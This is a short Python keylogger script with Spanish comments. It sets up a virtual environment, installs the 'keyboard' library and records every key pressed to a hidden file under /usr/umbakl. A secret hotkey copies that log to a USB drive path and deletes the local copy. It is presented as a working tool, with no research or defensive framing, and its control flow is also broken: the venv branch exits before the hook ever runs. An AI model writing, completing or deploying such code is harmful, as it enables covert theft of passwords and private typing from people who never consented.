#!/usr/bin/python3
import os

os.chdir("/usr")
try:
    os.chdir("/usr/umbakl")
except:
    os.makedirs("/usr/umbakl")

os.chdir("/usr/umbakl")
with open("/usr/umbakl/umbakl.txt", "a"):
    pass

os.chdir("/usr/umbakl")

import sys
import subprocess
from pathlib import Path


venv_path = Path("/usr/umbakl/.venv")
python_bin = venv_path / "bin" / "python3"

# 1) Si ya estamos dentro del venv, ejecutamos normalmente
if os.environ.get("VIRTUAL_ENV") == str(venv_path):
    import requests  # librería instalada
    print("Dentro del venv. Todo listo.")
    sys.exit(0)

# 2) Crear venv si no existe
if not venv_path.exists():
    subprocess.check_call([sys.executable, "-m", "venv", str(venv_path)])

# 3) Instalar la librería en el venv
subprocess.check_call([python_bin, "-m", "pip", "install", "keyboard"])

# 4) Reejecutar el script usando el python del venv
os.execv(python_bin, [str(python_bin), __file__])

    
import keyboard

pressed = set()

def on_key(event):
    global ultima_tecla
    if event.event_type == "down":
        if event.scan_code not in pressed:
            pressed.add(event.scan_code)
            # aquí se declara event.name
            with open("/usr/umbakl/umbakl.txt", "a", encoding="utf-8") as f:
                f.write(event.name)
            keyboard.add_hotkey('u+m+b+a+k+l', Byebye)
    elif event.event_type == "up":
        if event.scan_code in pressed:
            pressed.remove(event.scan_code)

def Byebye():
    os.chdir("/")
    os.system("cp /usr/umbakl/umbakl.txt /media/usuario/3FB6-9A53") #ch
    os.system("rm -rf /usr/umbakl/umbakl.txt")
    exit()

keyboard.hook(on_key)
keyboard.wait()
